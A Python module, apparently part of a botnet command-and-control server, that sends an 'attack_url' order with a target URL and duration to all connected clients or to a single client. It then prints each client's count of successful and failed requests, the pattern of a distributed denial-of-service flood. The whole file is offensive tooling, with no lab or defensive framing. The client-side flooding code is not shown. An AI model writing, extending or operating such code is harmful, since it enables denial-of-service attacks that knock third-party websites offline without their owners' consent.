from utils.logger import get_console
from utils.validator import validate_client_spec

class AttackUrlHandler():
    def __init__(self, client_manager):
        self.client_manager = client_manager
        self.console = get_console()
        
    def enviar_comando_attack_url(self, url, tiempo, cliente_id=None):
        """Envía comando para atacar una URL durante un tiempo específico."""
        if not url.startswith("http://") and not url.startswith("https://"):
            self.console.print("[bold red]Error: La URL debe comenzar con http:// o https://[/bold red]")
            return False
        
        if tiempo <= 0:
            self.console.print("[bold yellow]Warning: El tiempo debe ser mayor a 0. Por defecto se usará 10[/bold yellow]")
            tiempo = 10
        
        mensaje = {
            "accion": "attack_url",
            "url": url,
            "tiempo": tiempo
        }
        
        if cliente_id is None:
            self.client_manager.servidor.enviar_comando_todos(mensaje)
        else:
            if not validate_client_spec(str(cliente_id)):
                self.console.print("[bold red]Error: ID de cliente no válido.[/bold red]")
                return False
            if not self.client_manager.servidor.obtener_cliente_por_id(cliente_id):
                self.console.print(f"[bold red]Error: Cliente con ID {cliente_id} no existe.[/bold red]")
                return False
            self.client_manager.servidor.enviar_comando_cliente(cliente_id, mensaje)
        
        self.console.print(f"[bold green]Atacando la pagina web {url} por {tiempo}s [/bold green]")
        return True
    
    def _manejar_respuesta_ataque(self, datos, cliente_id):
        url = datos.get("url", "Desconocida")
        duracion = datos.get("duracion", "N/A")
        exitosas = datos.get("exitosas", 0)
        fallidas = datos.get("fallidas", 0)
        errores = datos.get("errores", [])

        self.console.print(f"\n[bold cyan]📡 Resultado del ataque del cliente {cliente_id}:[/bold cyan]")
        self.console.print(f"🌐 URL: {url}")
        self.console.print(f"⏱️  Duración: {duracion} segundos")
        self.console.print(f"✅ Peticiones exitosas: {exitosas}")
        self.console.print(f"❌ Peticiones fallidas: {fallidas}")

        if errores:
            self.console.print("[red]Errores detectados:[/red]")
            for error in errores:
                self.console.print(f"   • {error}")
        else:
            self.console.print("[green]Sin errores reportados[/green]")